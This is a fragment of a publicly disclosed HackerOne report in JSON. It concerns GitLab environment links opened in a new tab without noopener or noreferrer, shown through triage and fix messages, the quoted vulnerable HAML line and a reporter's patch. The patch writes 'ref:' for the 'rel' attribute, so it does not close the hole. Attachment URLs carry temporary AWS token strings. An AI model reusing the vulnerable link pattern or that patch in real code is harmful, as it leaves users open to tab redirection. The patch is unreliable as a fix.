Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":166659,"file_name":"environments-gitlab.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/659/dcece84bf3acf8f08217cc798f629c5e690a6226/environments-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22environments-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27environments-gitlab.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045649Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=954526b9dde6198c0132b840f82af033bde3140a475767fbfc001e4ae8f2348c","file_size":27202,"type":"image/png"},{"id":166660,"file_name":"login-gitlab.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/660/2192dfde731fec97449c3d309d00d357e56efa6c/login-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22login-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27login-gitlab.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045649Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=1fb60f5da999937274f4b5583c8143543712711223dd56f285c0b08e40a981e1","file_size":97785,"type":"image/png"},{"id":166662,"file_name":"404-gitlab.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/662/ab7bb15273e094a92d69f93e2b1f4a63b2fbd13a/404-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22404-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27404-gitlab.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045649Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=e71f84345a954e57e02b7ea9ab34af7a52291d8123e2172a1f7760cf9c9c9df6","file_size":17935,"type":"image/png"}],"allow_singular_disclosure_at":"2017-04-20T08:57:54.951Z","allow_singular_disclosure_after":-116539134.67933992,"singular_disclosure_allowed":true,"vote_count":7,"voters":["delimitry","a_d_a_m","eveeez","hacklad","spetr0x","b73772bded7541989b54f6a","hackiavelli"],"severity":{"rating":"low","score":3.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1522619,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @edio,\n\nThanks for the report! We've tried to make sure that all external links include noopener and noreferrer, but we've clearly missed some places. In this case the attack surface is fairly low as only user with developer access to a project can view the environments, however there is still a chance for exploitation. I'll open a confidential internal issue to get it fixed and I'll update you here when we have a patch ready.\n\nThe confidential issue is here: https://gitlab.com/gitlab-org/gitlab-ce/issues/29081\n\nThis issue will be opened to the public when a patch is released.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the report! We\u0026#39;ve tried to make sure that all external links include noopener and noreferrer, but we\u0026#39;ve clearly missed some places. In this case the attack surface is fairly low as only user with developer access to a project can view the environments, however there is still a chance for exploitation. I\u0026#39;ll open a confidential internal issue to get it fixed and I\u0026#39;ll update you here when we have a patch ready.\u003c/p\u003e\n\n\u003cp\u003eThe confidential issue is here: \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/29081\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F29081\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/issues/29081\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis issue will be opened to the public when a patch is released.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-06T19:09:48.207Z","updated_at":"2017-03-06T19:09:48.207Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1534703,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @briann,\n\nI had a quick look at your source code and found where this issue lies. Hopefully this helps you fix this issue.\n\n~~~\n- if environment.external_url \u0026\u0026 can?(current_user, :read_environment, environment)\n  = link_to environment.external_url, target: '_blank', class: 'btn external-url' do\n    = icon('external-link')\n~~~\n\nLink to source code: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/app/views/projects/environments/_external_url.html.haml\n\n I have attached a patch below.\n\n~~~diff\n - if environment.external_url \u0026\u0026 can?(current_user, :read_environment, environment)\n-    = link_to environment.external_url, target: '_blank', class: 'btn external-url' do\n+    = link_to environment.external_url, target: '_blank', ref: 'noreferrer nofollow noopener', class: 'btn external-url' do\n       = icon('external-link')\n~~~\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI had a quick look at your source code and found where this issue lies. Hopefully this helps you fix this issue.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e- if environment.external_url \u0026amp;\u0026amp; can?(current_user, :read_environment, environment)\n  = link_to environment.external_url, target: \u0026#39;_blank\u0026#39;, class: \u0026#39;btn external-url\u0026#39; do\n    = icon(\u0026#39;external-link\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLink to source code: \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/blob/master/app/views/projects/environments/_external_url.html.haml\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fblob%2Fmaster%2Fapp%2Fviews%2Fprojects%2Fenvironments%2F_external_url.html.haml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/blob/master/app/views/projects/environments/_external_url.html.haml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI have attached a patch below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e - if environment.external_url \u0026amp;\u0026amp; can?(current_user, :read_environment, environment)\n\u003cspan class=\"gd\"\u003e-    = link_to environment.external_url, target: \u0026#39;_blank\u0026#39;, class: \u0026#39;btn external-url\u0026#39; do\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    = link_to environment.external_url, target: \u0026#39;_blank\u0026#39;, ref: \u0026#39;noreferrer nofollow noopener\u0026#39;, class: \u0026#39;btn external-url\u0026#39; do\n\u003c/span\u003e       = icon(\u0026#39;external-link\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-11T17:55:14.118Z","updated_at":"2017-03-11T17:55:14.118Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":168098,"filename":"_external_url.html.haml","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/168/098/073bec4c12cbb364816737ae3671955a25a3e1bf/_external_url.html.haml?response-content-disposition=attachment%3B%20filename%3D%22_external_url.html.haml%22%3B%20filename%2A%3DUTF-8%27%27_external_url.html.haml\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045649Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=21b16908fe338903460338d2681e0a5c33871d506bbd53debe7c816a208cec6a"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1534751,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the patch, but we already have a patch ready to go for this missing `ref:` and a few others. It should be included with our next security release, hopefully in the next week or so.\n\nBtw, do you have a preferred contact link you'd like us to include when we acknowledge you for this report? People often use their Twitter, blog, Facebook, or HackerOne links.","markdown_message":"\u003cp\u003eThanks for the patch, but we already have a patch ready to go for this missing \u003ccode\u003eref:\u003c/code\u003e and a few others. It should be included with our next security release, hopefully in the next week or so.\u003c/p\u003e\n\n\u003cp\u003eBtw, do you have a preferred contact link you\u0026#39;d like us to include when we acknowledge you for this report? People often use their Twitter, blog, Facebook, or HackerOne links.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-11T18:37:43.636Z","updated_at":"2017-03-11T18:37:43.636Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1534753,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Thanks for the patch, but we already have a patch ready to go [...]\n\nGreat! :)\n\n\u003e Btw, do you have a preferred contact link you'd like us to include when we acknowledge you for this report?\n\nThank you! My twitter is: [@EdOverflow](https://twitter.com/EdOverflow)","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eThanks for the patch, but we already have a patch ready to go [...]\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eGreat! :)\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eBtw, do you have a preferred contact link you\u0026#39;d like us to include when we acknowledge you for this report?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThank you! My twitter is: \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FEdOverflow\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@EdOverflow\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-11T18:42:58.485Z","updated_at":"2017-03-11T18:42:58.485Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1553745,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @edio,\n\nA fix for this issue was contained in our latest security release. Thanks again for the report!\n\nhttps://about.gitlab.com/2017/03/20/gitlab-8-dot-17-dot-4-security-release/\n\nhttps://about.gitlab.com/vulnerability-acknowledgements/ (this will take some time to reflect updates)","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edio\"\u003e@edio\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eA fix for this issue was contained in our latest security release. Thanks again for the report!\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://about.gitlab.com/2017/03/20/gitlab-8-dot-17-dot-4-security-release/\" href=\"/redirect?url=https%3A%2F%2Fabout.gitlab.com%2F2017%2F03%2F20%2Fgitlab-8-dot-17-dot-4-security-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://about.gitlab.com/2017/03/20/gitlab-8-dot-17-dot-4-security-release/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://about.gitlab.com/vulnerability-acknowledgements/\" href=\"/redirect?url=https%3A%2F%2Fabout.gitlab.com%2Fvulnerability-acknowledgements%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://about.gitlab.com/vulnerability-acknowledgements/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (this will take some time to reflect updates)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T01:03:22.834Z","updated_at":"2017-03-21T01:03:22.834Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"edoverflow","url":"/edoverflow"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1554047,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @briann,\n\nThank you very much for the acknowledgement and the quick fix! Would it be possible to disclose this report publicly in order to inform fellow researchers?\n\nBest regards,\nEd","markdown_message":"\u003cp\u003eHi \u003ca href=\"/briann\"\u003e@briann\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you very much for the acknowledgement and the quick fix! Would it be possible to disclose this report publicly in order to inform fellow researchers?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T08:57:54.911Z","updated_at":"2017-03-21T08:57:54.911Z","first_to_agree":true,"actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1554886,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Absolutely.","markdown_message":"\u003cp\u003eAbsolutely.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T15:58:42.663Z","updated_at":"2017-03-21T15:58:42.663Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1554887,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-21T15:58:42.755Z","updated_at":"2017-03-21T15:58:42.755Z","actor":{"username":"briann","cleared":false,"url":"/briann","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}